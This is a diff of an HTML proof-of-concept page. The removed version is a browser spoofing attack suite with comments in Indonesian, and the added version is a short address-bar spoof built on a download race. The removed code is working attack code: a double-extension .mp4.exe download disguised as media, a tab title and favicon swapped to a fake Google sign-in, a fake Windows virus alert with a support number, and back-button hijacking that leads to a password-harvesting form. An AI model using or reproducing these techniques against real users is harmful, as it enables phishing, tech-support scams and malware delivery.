@@ -1,187 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<!-- MODUL 4: Open Graph spoofing — dipakai platform preview (WhatsApp, Discord, X) -->
-<meta property="og:title" content="Hot Video - Full HD 1080p Free Download">
-<meta property="og:description" content="Watch now — no registration required">
-<meta property="og:image" content="/preview-youtube-style.png">
-<title>Free HD Video Streaming</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' rx='3' fill='%234285F4'/%3E%3Cpath d='M8 3a5 5 0 1 0 4.9 6h-2A3 3 0 1 1 8 5v2.5L11.5 5 8 1.5z' fill='%23fff'/%3E%3C/svg%3E">
-
-<style>
-  body { font-family: Arial, sans-serif; background:#111; color:#eee;
-         text-align:center; padding:30px 15px; }
-  .m { max-width:640px; margin:14px auto; background:#1c1c1c;
-       padding:16px; border-radius:10px; text-align:left; }
-  button { padding:10px 16px; margin:6px 4px; border:none; border-radius:4px;
-           background:#e50914; color:#fff; cursor:pointer; }
-  button.secondary { background:#444; }
-  pre { background:#222; color:#9fd49f; padding:8px; font-size:12px;
-        white-space:pre-wrap; max-height:200px; overflow:auto; }
-  /* MODUL 3: fake OS dialog overlay */
-  #fakeDialog { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7);
-                z-index:9999; align-items:center; justify-content:center; }
-  .win95 { width:340px; background:#d4d0c8; border:2px solid #7f7f7f;
-           box-shadow:2px 2px 0 #000; font:12px Tahoma, sans-serif; color:#000; }
-  .win95 .t { background:#000080; color:#fff; padding:4px 8px; font-weight:bold;
-              display:flex; justify-content:space-between; }
-  .win95 .b { padding:14px 10px; display:flex; gap:10px; }
-  .win95 .btns { padding:0 10px 12px; text-align:right; }
-  .win95 button { background:#d4d0c8; color:#000; border:1px solid #7f7f7f;
-                  padding:3px 14px; font:11px Tahoma; }
-</style>
+<title>Research PoC - Download Nav Race</title>
 </head>
 <body>
-<h2>Browser Spoofing PoC Suite</h2>
-
-<div class="m">
-  <b>Modul 1 — Download spoofing (media delivery)</b><br>
-  Klik: browser mengunduh file yang di Content-Disposition diberi nama
-  <code>episode_01.mp4.exe</code> / <code>.apk</code>. Di Android,
-  unduhan tampil di notification drawer seperti konten media.
-  <br>
-  <button onclick="dlSpoof()">Download Episode (spoofed)</button>
-</div>
-
-<div class="m">
-  <b>Modul 2 — Tab title + favicon spoofing (session/in-page)</b><br>
-  Tab berubah menjadi tampilan login "Google Security Check" — dipakai
-  saat victim berpindah tab (title spoofing saat blur).
-  <br>
-  <button class="secondary" onclick="spoofTab()">Spoof Tab Title</button>
-  <button class="secondary" onclick="restoreTab()">Restore</button>
-</div>
-
-<div class="m">
-  <b>Modul 3 — Fake OS security alert (in-page overlay)</b><br>
-  Dialog gaya Windows "VIRUS DETECTED — Call support now" (scareware pattern).
-  <br>
-  <button onclick="fakeAlert()">Trigger Fake OS Alert</button>
-</div>
-
-<div class="m">
-  <b>Modul 5 — Back-button phishing (history spoofing)</b><br>
-  Menyuntik history entry palsu: tombol Back browser membawa victim ke
-  halaman phishing di origin yang sama, bukan keluar dari site.
-  <br>
-  <button onclick="backHijack()">Arm Back-button Hijack</button>
-</div>
-
-<pre id="log"></pre>
-
-<!-- MODUL 3: overlay -->
-<div id="fakeDialog">
-  <div class="win95">
-    <div class="t"><span>Windows Security Alert</span><span>✕</span></div>
-    <div class="b">
-      <div style="font-size:32px;">⚠️</div>
-      <div>
-        <b>VIRUS DETECTED on your device!</b><br>
-        3 Trojan files found. Do NOT shut down.<br>
-        Call Microsoft Support immediately:<br>
-        <b style="font-size:14px;">+1-888-555-0199</b>
-      </div>
-    </div>
-    <div class="btns">
-      <button onclick="closeFake()">OK</button>
-      <button onclick="closeFake()">Scan Now</button>
-    </div>
-  </div>
-</div>
-
+<h3>PoC: Address bar spoof via download race</h3>
+<p>Expected: URL bar shows evil.html after navigation.<br>
+Bug (if present): URL bar still shows the original download URL.</p>
 <script>
-const logEl = document.getElementById('log');
-const lines = [];
-const ts = () => new Date().toISOString().slice(11, 23);
-function log(m) { lines.unshift(`[${ts()}] ${m}`); logEl.textContent = lines.join('\n'); }
-log('PoC loaded. UA: ' + navigator.userAgent);
-
-/* ---------- MODUL 1: download spoofing ----------
-   Endpoint /payload harus merespon dengan header:
-   Content-Disposition: attachment; filename="episode_01.mp4.exe"
-   Content-Type: application/octet-stream
-   Di Chrome/Firefox desktop: dialog save muncul dengan nama .mp4.exe
-   (double-extension). Di Chrome Android: muncul notifikasi
-   "File downloaded" di drawer — pretexts sebagai media. */
-function dlSpoof() {
-  log('Requesting spoofed download: /payload (episode_01.mp4.exe)');
-  const a = document.createElement('a');
-  a.href = '/payload?name=episode_01.mp4.exe';
-  a.download = 'episode_01.mp4.exe';
-  document.body.appendChild(a);
+// 1. Trigger a download that stays active (slow drip keeps it alive)
+function slowDownload() {
+  const blob = new Blob([new ArrayBuffer(1024)], {type: "application/octet-stream"});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "report.pdf";
   a.click();
-  a.remove();
-  log('Download initiated — check downloads bar (desktop) or ' +
-      'notification drawer (Android). Server MUST send matching ' +
-      'Content-Disposition for max fidelity.');
 }
 
-/* ---------- MODUL 2: tab title/favicon spoofing ---------- */
-const legitTitle = document.title;
-const legitIcon = document.querySelector('link[rel="icon"]');
-function spoofTab() {
-  document.title = 'Sign in - Google Accounts';
-  // favicon Google G (data URI) — tab berubah jadi "Google"
-  const l = document.createElement('link');
-  l.rel = 'icon';
-  l.href = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"%3E%3Cpath fill="%234285F4" d="M45 24c0-1.6-.1-3.2-.4-4.7H24v9h11.8C35 32.9 30.1 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l6-6C34.6 6 29.6 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20z"%3E%3C/path%3E%3C/svg%3E';
-  l.id = 'spoofIcon';
-  document.head.appendChild(l);
-  // trigger juga saat user pindah tab (visibilitychange — tab-swap attack)
-  document.addEventListener('visibilitychange', () => {
-    if (document.hidden) {
-      document.title = 'Sign in - Google Accounts';
-      log('visibilitychange fired — title spoofed while tab in background.');
-    }
-  });
-  log('Tab title + favicon spoofed to "Sign in - Google Accounts". ' +
-      'Visible in tab strip / recent-apps switcher.');
-}
-function restoreTab() {
-  document.title = legitTitle;
-  const s = document.getElementById('spoofIcon');
-  if (s) s.remove();
-  log('Tab restored to legit title.');
-}
-
-/* ---------- MODUL 3: fake OS alert ---------- */
-function fakeAlert() {
-  document.getElementById('fakeDialog').style.display = 'flex';
-  // vibration di Android menambah urgensi (ada di Chrome Android)
-  if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
-  log('Fake OS security dialog displayed' +
-      (navigator.vibrate ? ' + vibration triggered (Android)' : '') + '.');
-}
-function closeFake() {
-  document.getElementById('fakeDialog').style.display = 'none';
-  log('Fake dialog dismissed by victim.');
-}
-
-/* ---------- MODUL 5: back-button hijack ---------- */
-let armed = false;
-function backHijack() {
-  if (armed) return log('Already armed.');
-  armed = true;
-  // pushState 5 entry palsu — back pertama victim masuk ke phishing state
-  for (let i = 0; i < 5; i++) {
-    history.pushState({ phish: i }, '', '?step=verify-account');
-  }
-  window.onpopstate = (e) => {
-    // back-button membawa victim ke tampilan "verify account" phishing
-    document.title = 'Verify Your Account — Security Required';
-    document.body.innerHTML =
-      '<h2>Session Expired</h2><p>Your account requires immediate ' +
-      'verification. Please re-enter your password:</p>' +
-      '<input type="password" placeholder="Password">' +
-      '<button>Verify Now</button>';
-    log('popstate: back button intercepted — victim landed on ' +
-        'in-origin phishing page instead of leaving the site.');
-  };
-  log('History poisoned with 5 fake entries. Victim pressing Back ' +
-      'stays trapped in this origin (back-button phishing).');
+// 2. Immediately navigate to attacker-controlled "phishing" content
+//    while the download is still in progress
+function run() {
+  slowDownload();
+  setTimeout(() => {
+    location.replace(location.href.split("#")[0] + "#phishing-content");
+    // For a real test, replace() to a different origin page you control:
+    // location.replace("https://YOUR-TEST-ORIGIN.example/evil.html");
+  }, 50);
 }
 </script>
+<button onclick="run()">Start PoC</button>
 </body>
 </html>
